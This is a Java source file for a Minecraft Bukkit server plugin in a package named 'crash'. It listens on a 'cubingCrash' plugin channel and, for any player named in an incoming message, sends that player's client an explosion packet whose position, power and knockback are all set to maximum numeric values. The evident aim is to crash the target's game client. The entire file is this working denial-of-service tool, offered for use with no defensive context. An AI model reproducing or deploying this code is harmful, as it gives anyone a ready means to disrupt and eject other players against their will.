package speedcubing.crash;

import com.google.common.io.ByteArrayDataInput;
import com.google.common.io.ByteStreams;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.Vec3D;
import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.plugin.messaging.PluginMessageListener;

import java.util.ArrayList;

public class Main extends JavaPlugin implements PluginMessageListener {
    public void onEnable() {
        Bukkit.getMessenger().registerIncomingPluginChannel(this, "cubingCrash", this);
    }

    @Override
    public void onPluginMessageReceived(String s, Player player, byte[] bytes) {
        ByteArrayDataInput in = ByteStreams.newDataInput(bytes);
        ((CraftPlayer)Bukkit.getPlayer(  in.readUTF())).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, new ArrayList<>(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
    }
}
